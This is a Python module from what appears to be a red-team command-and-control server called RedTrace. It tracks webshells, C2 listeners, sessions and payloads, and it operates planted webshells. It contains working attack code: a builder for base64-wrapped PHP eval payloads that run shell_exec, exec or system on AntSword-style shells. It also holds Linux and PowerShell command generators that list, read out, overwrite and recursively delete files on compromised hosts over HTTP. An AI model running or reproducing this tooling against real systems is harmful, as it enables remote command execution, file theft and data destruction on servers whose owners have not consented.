from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import secrets
import shlex
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from typing import Any

import requests

from redtrace.server import db
from redtrace.server.event_hub import event_hub
from redtrace.server.services import next_fact_id, utcnow

LOG = logging.getLogger(__name__)

RESOURCE_KINDS = {
    "webshell",
    "c2_listener",
    "c2_session",
    "c2_payload",
    "c2_profile",
    "proxy",
    "file",
    "credential_ref",
    "plugin",
    "result",
}
EXECUTABLE_KINDS = {"webshell", "plugin"}
RISK_LEVELS = {"low", "medium", "high", "critical"}
TERMINAL_TASK_STATES = {"succeeded", "failed", "cancelled", "rejected"}
MAX_RESULT_BYTES = 2 * 1024 * 1024
C2_STALE_SECONDS = 120


def json_load(value: str | None, fallback: Any) -> Any:
    if not value:
        return fallback
    try:
        return json.loads(value)
    except (TypeError, json.JSONDecodeError):
        return fallback


def json_dump(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def resource_id(kind: str) -> str:
    prefixes = {
        "webshell": "ws",
        "c2_listener": "lis",
        "c2_session": "ses",
        "c2_payload": "pay",
        "c2_profile": "prf",
        "proxy": "prx",
        "file": "fil",
        "credential_ref": "cred",
        "plugin": "plg",
        "result": "res",
    }
    return f"{prefixes.get(kind, 'rsc')}_{uuid.uuid4().hex[:12]}"


def task_id() -> str:
    return f"op_{uuid.uuid4().hex[:14]}"


def result_id() -> str:
    return f"out_{uuid.uuid4().hex[:14]}"


def hash_token(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def verify_token(value: str, expected_hash: str) -> bool:
    return bool(value and expected_hash) and hmac.compare_digest(hash_token(value), expected_hash)


def public_resource(row: Any) -> dict[str, Any]:
    item = dict(row)
    secret = json_load(item.pop("secret_json", "{}"), {})
    item["metadata"] = json_load(item.pop("metadata_json", "{}"), {})
    item["has_secret"] = bool(secret)
    item["worker_paused"] = bool(item.get("worker_paused"))
    item["locked"] = bool(item.get("locked_by"))
    if item["kind"] == "c2_listener":
        item["checkin_path"] = f"/c2/checkin/{item['id']}"
    if item["kind"] == "c2_session":
        item["poll_path"] = f"/c2/sessions/{item['id']}/poll"
    return item


def public_task(row: Any) -> dict[str, Any]:
    item = dict(row)
    item["input"] = json_load(item.pop("input_json", "{}"), {})
    item["requires_approval"] = bool(item.get("requires_approval"))
    item["cancel_requested"] = bool(item.get("cancel_requested"))
    return item


def public_audit(row: Any) -> dict[str, Any]:
    item = dict(row)
    item["detail"] = json_load(item.pop("detail_json", "{}"), {})
    return item


def audit_event(
    conn,
    *,
    project_id: str,
    resource_id_value: str | None,
    task_id_value: str | None,
    actor_type: str,
    actor: str,
    action: str,
    status: str,
    detail: dict[str, Any] | None = None,
) -> None:
    now = utcnow()
    safe_detail = detail or {}
    cursor = conn.execute(
        """
        INSERT INTO resource_audit_events (
            project_id, resource_id, task_id, actor_type, actor, action,
            status, detail_json, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            project_id,
            resource_id_value,
            task_id_value,
            actor_type,
            actor,
            action,
            status,
            json_dump(safe_detail),
            now,
        ),
    )
    event_hub.publish(
        project_id,
        {
            "type": "resource.audit",
            "id": cursor.lastrowid,
            "project_id": project_id,
            "resource_id": resource_id_value,
            "task_id": task_id_value,
            "actor_type": actor_type,
            "actor": actor,
            "action": action,
            "status": status,
            "detail": safe_detail,
            "created_at": now,
        },
    )


def expire_stale_c2_sessions(conn, project_id: str) -> list[str]:
    cutoff = (datetime.now(timezone.utc) - timedelta(seconds=C2_STALE_SECONDS)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )
    rows = conn.execute(
        """
        SELECT id FROM shared_resources
        WHERE project_id = ? AND kind = 'c2_session' AND status = 'available'
          AND last_seen_at IS NOT NULL AND last_seen_at < ?
        """,
        (project_id, cutoff),
    ).fetchall()
    if not rows:
        return []
    now = utcnow()
    ids = [row["id"] for row in rows]
    for session_id in ids:
        conn.execute(
            "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
            (now, session_id),
        )
        audit_event(
            conn,
            project_id=project_id,
            resource_id_value=session_id,
            task_id_value=None,
            actor_type="system",
            actor="session-monitor",
            action="c2.session_offline",
            status="offline",
        )
    return ids


def _fact_summary(kind: str, name: str, rid: str, target: str, summary: str) -> str:
    kind_labels = {
        "webshell": "WebShell",
        "c2_listener": "C2 Listener",
        "c2_session": "C2 Session",
        "c2_payload": "C2 载荷",
        "c2_profile": "C2 流量伪装",
        "proxy": "代理通道",
        "file": "文件",
        "credential_ref": "凭据引用",
        "plugin": "插件",
        "result": "任务结果",
    }
    parts = [f"[resource:{rid}] 已登记{kind_labels.get(kind, kind)}：{name}"]
    if target:
        parts.append(f"目标 {target}")
    if summary:
        parts.append(summary[:240])
    return "；".join(parts)


def create_resource(
    conn,
    *,
    project_id: str,
    kind: str,
    name: str,
    target: str = "",
    summary: str = "",
    status: str = "available",
    metadata: dict[str, Any] | None = None,
    secret: dict[str, Any] | None = None,
    actor_type: str,
    actor: str,
    worker: str | None = None,
    intent_id: str | None = None,
    fact_id: str | None = None,
    parent_resource_id: str | None = None,
    source_task_id: str | None = None,
    publish_fact: bool = True,
) -> tuple[dict[str, Any], str | None]:
    if kind not in RESOURCE_KINDS:
        raise ValueError(f"unsupported resource kind: {kind}")
    rid = resource_id(kind)
    now = utcnow()
    resource_secret = dict(secret or {})
    secret_once: str | None = None
    if kind == "c2_listener":
        secret_once = secrets.token_urlsafe(32)
        resource_secret = {
            "listener_token_sha256": hash_token(secret_once),
            "listener_token": secret_once,
        }
        status = status if status in {"available", "offline"} else "offline"
    if parent_resource_id is not None:
        parent = conn.execute(
            "SELECT id FROM shared_resources WHERE id = ? AND project_id = ?",
            (parent_resource_id, project_id),
        ).fetchone()
        if parent is None:
            raise ValueError("parent resource not found")
    conn.execute(
        """
        INSERT INTO shared_resources (
            id, project_id, kind, name, status, target, summary, metadata_json,
            secret_json, created_by_type, created_by, worker, intent_id, fact_id,
            parent_resource_id, source_task_id, created_at, updated_at, last_seen_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            rid,
            project_id,
            kind,
            name.strip(),
            status,
            target.strip(),
            summary.strip(),
            json_dump(metadata or {}),
            json_dump(resource_secret),
            actor_type,
            actor,
            worker,
            intent_id,
            fact_id,
            parent_resource_id,
            source_task_id,
            now,
            now,
            now if kind == "c2_session" else None,
        ),
    )
    if publish_fact and fact_id is None and kind in {
        "webshell",
        "c2_listener",
        "c2_session",
        "c2_payload",
        "c2_profile",
        "proxy",
        "credential_ref",
        "plugin",
        "result",
    }:
        fid = next_fact_id(conn, project_id)
        conn.execute(
            "INSERT INTO facts (id, project_id, description) VALUES (?, ?, ?)",
            (fid, project_id, _fact_summary(kind, name, rid, target, summary)),
        )
        conn.execute(
            "UPDATE shared_resources SET fact_id = ? WHERE id = ?",
            (fid, rid),
        )
    audit_event(
        conn,
        project_id=project_id,
        resource_id_value=rid,
        task_id_value=source_task_id,
        actor_type=actor_type,
        actor=actor,
        action="resource.register",
        status="succeeded",
        detail={"kind": kind, "name": name, "target": target, "intent_id": intent_id},
    )
    row = conn.execute("SELECT * FROM shared_resources WHERE id = ?", (rid,)).fetchone()
    return public_resource(row), secret_once


def store_result(conn, project_id: str, task_id_value: str, content: str) -> tuple[str, str]:
    encoded = content.encode("utf-8", errors="replace")
    if len(encoded) > MAX_RESULT_BYTES:
        encoded = encoded[:MAX_RESULT_BYTES]
        content = encoded.decode("utf-8", errors="replace") + "\n\n[output truncated by RedTrace]"
        encoded = content.encode("utf-8")
    rid = result_id()
    digest = hashlib.sha256(encoded).hexdigest()
    conn.execute(
        """
        INSERT INTO operation_results (
            id, project_id, task_id, content_type, content, size_bytes, sha256, created_at
        ) VALUES (?, ?, ?, 'text/plain; charset=utf-8', ?, ?, ?, ?)
        """,
        (rid, project_id, task_id_value, content, len(encoded), digest, utcnow()),
    )
    return rid, f"/projects/{project_id}/operations/results/{rid}"


def output_summary(content: str, limit: int = 600) -> str:
    compact = " ".join(content.split())
    if len(compact) <= limit:
        return compact
    return compact[:limit] + "…"


def _webshell_command(action: str, arguments: dict[str, Any]) -> tuple[str, str | None]:
    if action == "command":
        command = str(arguments.get("command", "")).strip()
        if not command:
            raise ValueError("command is required")
        return command, None
    if action == "probe":
        token = f"RT_{secrets.token_hex(8)}"
        return f"printf %s {shlex.quote(token)}", token
    path = str(arguments.get("path", "")).strip()
    if not path:
        raise ValueError("path is required")
    quoted_path = shlex.quote(path)
    if action == "list_files":
        return (
            f"find {quoted_path} -mindepth 1 -maxdepth 1 "
            r"-printf '%y\t%f\t%TY-%Tm-%Td %TH:%TM:%TS\t%s\t%m\n'",
            None,
        )
    if action == "read_file":
        return f"base64 -- {quoted_path}", None
    if action == "write_file":
        if "content_base64" not in arguments:
            raise ValueError("content_base64 is required")
        content_base64 = str(arguments.get("content_base64", "")).strip()
        return (
            f"printf %s {shlex.quote(content_base64)} | base64 -d > {quoted_path}",
            None,
        )
    if action == "create_directory":
        return f"mkdir -p -- {quoted_path}", None
    if action == "create_file":
        return f"touch -- {quoted_path}", None
    if action == "move_file":
        destination = str(arguments.get("destination", "")).strip()
        if not destination:
            raise ValueError("destination is required")
        return f"mv -- {quoted_path} {shlex.quote(destination)}", None
    if action == "delete_file":
        return f"rm -rf -- {quoted_path}", None
    raise ValueError(f"unsupported WebShell action: {action}")


def _webshell_target_os(metadata: dict[str, Any]) -> str:
    configured = str(metadata.get("os") or "auto").strip().lower()
    if configured in {"linux", "windows"}:
        return configured
    shell_type = str(metadata.get("shell_type") or "").strip().lower()
    return "windows" if shell_type in {"asp", "aspx"} else "linux"


def _webshell_command_for_os(
    action: str,
    arguments: dict[str, Any],
    metadata: dict[str, Any],
) -> tuple[str, str | None]:
    if action in {"command", "probe"}:
        if action == "command":
            command = str(arguments.get("command", "")).strip()
            if not command:
                raise ValueError("command is required")
            return command, None
        token = f"RT_{secrets.token_hex(8)}"
        if _webshell_target_os(metadata) == "windows":
            return f"echo {token}", token
        return f"printf %s {shlex.quote(token)}", token

    target_os = _webshell_target_os(metadata)
    path = str(arguments.get("path", "")).strip()
    if not path:
        raise ValueError("path is required")
    if target_os == "windows":
        quoted = '"' + path.replace('"', '""').replace("/", "\\") + '"'
        escaped_path = path.replace("'", "''")
        if action == "list_files":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Get-ChildItem -Force -LiteralPath '{escaped_path}' | ForEach-Object {{ "
                "$kind=if($_.PSIsContainer){'d'}else{'f'}; "
                "$size=if($_.PSIsContainer){0}else{$_.Length}; "
                "$mode=if($_.PSIsContainer){'d----'}else{'-a---'}; "
                "Write-Output ($kind+[char]9+$_.Name+[char]9+"
                "$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')+[char]9+$size+[char]9+$mode) }\"",
                None,
            )
        if action == "read_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped_path}'))\"",
                None,
            )
        if action == "write_file":
            if "content_base64" not in arguments:
                raise ValueError("content_base64 is required")
            content = str(arguments.get("content_base64", "")).strip()
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"[IO.File]::WriteAllBytes('{escaped_path}',[Convert]::FromBase64String('{content}'))\"",
                None,
            )
        if action == "create_directory":
            return f"mkdir {quoted}", None
        if action == "create_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"New-Item -ItemType File -Force -LiteralPath '{escaped_path}' | Out-Null\"",
                None,
            )
        if action == "move_file":
            destination = str(arguments.get("destination", "")).strip()
            if not destination:
                raise ValueError("destination is required")
            escaped_destination = destination.replace("'", "''")
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Move-Item -Force -LiteralPath '{escaped_path}' "
                f"-Destination '{escaped_destination}'\"",
                None,
            )
        if action == "delete_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Remove-Item -Recurse -Force -LiteralPath '{escaped_path}'\"",
                None,
            )
        raise ValueError(f"unsupported WebShell action: {action}")
    return _webshell_command(action, arguments)


def _php_eval_payload(command: str) -> tuple[str, str, str]:
    """Build a marker-delimited payload for one-line PHP eval shells.

    AntSword-style shells such as ``@eval($_POST['cmd']);`` expect PHP source
    in the password parameter, not the operating-system command itself.
    """

    marker = secrets.token_hex(8)
    begin = f"RTBEGIN{marker}"
    end = f"RTEND{marker}"
    encoded = base64.b64encode(command.encode("utf-8")).decode("ascii")
    payload = (
        "@set_time_limit(0);@ini_set('display_errors','0');"
        f"$c=base64_decode('{encoded}');$o='';"
        "if(function_exists('shell_exec')){$o=@shell_exec($c.' 2>&1');}"
        "elseif(function_exists('exec')){$a=array();@exec($c.' 2>&1',$a);$o=implode(\"\\n\",$a);}"
        "else{ob_start();@system($c.' 2>&1');$o=ob_get_clean();}"
        f"echo '{begin}'.base64_encode((string)$o).'{end}';"
    )
    return payload, begin, end


def _decode_webshell_response(
    response: Any,
    metadata: dict[str, Any],
    markers: tuple[str, str] | None,
) -> str:
    encoding = str(metadata.get("encoding") or "auto").strip().lower()
    if encoding in {"", "auto"}:
        encoding = getattr(response, "encoding", None) or "utf-8"
    if encoding == "gb18030":
        encoding = "gb18030"
    elif encoding == "gbk":
        encoding = "gbk"
    raw = getattr(response, "content", None)
    if isinstance(raw, (bytes, bytearray)):
        text = bytes(raw).decode(encoding, errors="replace")
    else:
        text = str(getattr(response, "text", ""))
    if markers is None:
        return text
    begin, end = markers
    start = text.find(begin)
    finish = text.find(end, start + len(begin)) if start >= 0 else -1
    if start < 0 or finish < 0:
        return text
    encoded = text[start + len(begin) : finish].strip()
    try:
        return base64.b64decode(encoded, validate=True).decode(encoding, errors="replace")
    except (ValueError, UnicodeError):
        return text


def execute_webshell_config(
    *,
    url: str,
    metadata: dict[str, Any],
    secret: dict[str, Any],
    command: str,
    probe_token: str | None = None,
) -> str:
    if not url:
        raise ValueError("WebShell target URL is empty")
    password = str(secret.get("password", ""))
    command_param = str(metadata.get("command_param") or password or "cmd").strip()
    shell_type = str(metadata.get("shell_type") or "").strip().lower()
    protocol = str(metadata.get("protocol") or ("eval" if shell_type == "php" else "raw")).strip().lower()
    wire_command = command
    markers: tuple[str, str] | None = None
    if shell_type == "php" and protocol in {"auto", "eval", "antsword"}:
        wire_command, begin, end = _php_eval_payload(command)
        markers = (begin, end)
    payload: dict[str, str] = {command_param: wire_command}
    password_param = str(metadata.get("password_param", "")).strip()
    if password_param and password:
        payload[password_param] = password
    headers = {
        str(key): str(value)
        for key, value in dict(metadata.get("headers") or {}).items()
        if str(key).strip()
    }
    method = str(metadata.get("method", "POST")).upper()
    timeout = min(max(float(metadata.get("timeout", 20)), 1.0), 60.0)
    verify_tls = bool(metadata.get("verify_tls", True))
    response = requests.request(
        method,
        url,
        params=payload if method == "GET" else None,
        data=None if method == "GET" else payload,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    response.raise_for_status()
    text = _decode_webshell_response(response, metadata, markers)
    if probe_token is not None and probe_token not in text:
        raise RuntimeError("WebShell responded without the one-time probe token")
    return text


def probe_webshell_config(
    *,
    url: str,
    metadata: dict[str, Any],
    secret: dict[str, Any],
) -> str:
    command, token = _webshell_command_for_os("probe", {}, metadata)
    return execute_webshell_config(
        url=url,
        metadata=metadata,
        secret=secret,
        command=command,
        probe_token=token,
    )


def execute_webshell(resource: Any, task: Any) -> str:
    metadata = json_load(resource["metadata_json"], {})
    secret = json_load(resource["secret_json"], {})
    arguments = json_load(task["input_json"], {})
    command, probe_token = _webshell_command_for_os(task["action"], arguments, metadata)
    return execute_webshell_config(
        url=resource["target"],
        metadata=metadata,
        secret=secret,
        command=command,
        probe_token=probe_token,
    )


def execute_plugin(resource: Any, task: Any) -> str:
    metadata = json_load(resource["metadata_json"], {})
    secret = json_load(resource["secret_json"], {})
    action = task["action"]
    allowed_actions = metadata.get("actions") or []
    if allowed_actions and action not in allowed_actions:
        raise ValueError(f"plugin action is not declared: {action}")
    endpoint = str(secret.get("endpoint") or resource["target"]).strip()
    if not endpoint:
        raise ValueError("plugin endpoint is empty")
    headers = {"Content-Type": "application/json", "Accept": "application/json, text/plain"}
    token = str(secret.get("token", "")).strip()
    if token:
        headers["Authorization"] = f"Bearer {token}"
    headers.update(
        {
            str(key): str(value)
            for key, value in dict(metadata.get("headers") or {}).items()
            if str(key).strip()
        }
    )
    payload = {
        "action": action,
        "arguments": json_load(task["input_json"], {}),
        "project_id": task["project_id"],
        "resource_id": resource["id"],
        "task_id": task["id"],
    }
    timeout = min(max(float(metadata.get("timeout", 60)), 1.0), 300.0)
    response = requests.post(endpoint, json=payload, headers=headers, timeout=timeout)
    response.raise_for_status()
    return response.text


class OperationExecutor:
    def __init__(self) -> None:
        self._pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="redtrace-operation")
        self._submitted: set[str] = set()
        self._lock = threading.Lock()

    def submit(self, task_id_value: str) -> None:
        with self._lock:
            if task_id_value in self._submitted:
                return
            self._submitted.add(task_id_value)
        self._pool.submit(self._run, task_id_value)

    def _run(self, task_id_value: str) -> None:
        try:
            self._run_inner(task_id_value)
        except Exception:
            LOG.exception("operation executor crashed task=%s", task_id_value)
        finally:
            with self._lock:
                self._submitted.discard(task_id_value)

    def _run_inner(self, task_id_value: str) -> None:
        with db.get_conn() as conn:
            task = conn.execute(
                "SELECT * FROM operation_tasks WHERE id = ?",
                (task_id_value,),
            ).fetchone()
            if task is None or task["status"] != "queued" or task["cancel_requested"]:
                return
            resource = conn.execute(
                "SELECT * FROM shared_resources WHERE id = ? AND project_id = ?",
                (task["resource_id"], task["project_id"]),
            ).fetchone()
            if resource is None:
                return
            if resource["kind"] == "c2_session":
                return
            if resource["kind"] not in EXECUTABLE_KINDS:
                self._finish_failure(conn, task, resource, "resource does not support operations")
                return
            now = utcnow()
            conn.execute(
                "UPDATE operation_tasks SET status = 'running', started_at = ? WHERE id = ?",
                (now, task_id_value),
            )
            audit_event(
                conn,
                project_id=task["project_id"],
                resource_id_value=task["resource_id"],
                task_id_value=task_id_value,
                actor_type=task["actor_type"],
                actor=task["actor"],
                action=f"operation.{task['action']}",
                status="running",
            )

        try:
            if resource["kind"] == "webshell":
                output = execute_webshell(resource, task)
            else:
                output = execute_plugin(resource, task)
        except Exception as exc:
            with db.get_conn() as conn:
                current = conn.execute(
                    "SELECT * FROM operation_tasks WHERE id = ?",
                    (task_id_value,),
                ).fetchone()
                if current is not None and current["status"] not in TERMINAL_TASK_STATES:
                    self._finish_failure(conn, current, resource, str(exc))
            return

        with db.get_conn() as conn:
            current = conn.execute(
                "SELECT * FROM operation_tasks WHERE id = ?",
                (task_id_value,),
            ).fetchone()
            if current is None or current["status"] in {"cancelled", "rejected"}:
                return
            out_id, ref = store_result(conn, current["project_id"], task_id_value, output)
            summary = output_summary(output) or "任务已完成，未返回文本输出"
            conn.execute(
                """
                UPDATE operation_tasks
                SET status = 'succeeded', output_summary = ?, result_ref = ?, completed_at = ?
                WHERE id = ?
                """,
                (summary, ref, utcnow(), task_id_value),
            )
            conn.execute(
                "UPDATE shared_resources SET status = 'available', updated_at = ?, last_seen_at = ? WHERE id = ?",
                (utcnow(), utcnow(), current["resource_id"]),
            )
            arguments = json_load(current["input_json"], {})
            fact_id_value = None
            if bool(arguments.get("publish_result")):
                result_resource, _ = create_resource(
                    conn,
                    project_id=current["project_id"],
                    kind="result",
                    name=f"{resource['name']} · {current['action']}",
                    target=ref,
                    summary=summary,
                    metadata={"result_id": out_id, "task_id": task_id_value},
                    actor_type=current["actor_type"],
                    actor=current["actor"],
                    worker=current["actor"] if current["actor_type"] == "worker" else None,
                    intent_id=current["intent_id"],
                    source_task_id=task_id_value,
                    publish_fact=True,
                )
                fact_id_value = result_resource.get("fact_id")
            conn.execute(
                "UPDATE operation_tasks SET fact_id = COALESCE(?, fact_id) WHERE id = ?",
                (fact_id_value, task_id_value),
            )
            audit_event(
                conn,
                project_id=current["project_id"],
                resource_id_value=current["resource_id"],
                task_id_value=task_id_value,
                actor_type=current["actor_type"],
                actor=current["actor"],
                action=f"operation.{current['action']}",
                status="succeeded",
                detail={"result_ref": ref, "summary": summary},
            )

    @staticmethod
    def _finish_failure(conn, task: Any, resource: Any, message: str) -> None:
        summary = output_summary(message) or "operation failed"
        conn.execute(
            """
            UPDATE operation_tasks
            SET status = 'failed', output_summary = ?, completed_at = ?
            WHERE id = ?
            """,
            (summary, utcnow(), task["id"]),
        )
        conn.execute(
            "UPDATE shared_resources SET status = 'degraded', updated_at = ? WHERE id = ?",
            (utcnow(), resource["id"]),
        )
        audit_event(
            conn,
            project_id=task["project_id"],
            resource_id_value=task["resource_id"],
            task_id_value=task["id"],
            actor_type=task["actor_type"],
            actor=task["actor"],
            action=f"operation.{task['action']}",
            status="failed",
            detail={"error": summary},
        )


operation_executor = OperationExecutor()


def resume_pending_tasks() -> None:
    with db.get_conn() as conn:
        rows = conn.execute(
            """
            SELECT t.id
            FROM operation_tasks t
            JOIN shared_resources r ON r.id = t.resource_id
            WHERE t.status = 'queued'
              AND t.cancel_requested = 0
              AND r.kind IN ('webshell', 'plugin')
            ORDER BY t.created_at
            """
        ).fetchall()
    for row in rows:
        operation_executor.submit(row["id"])
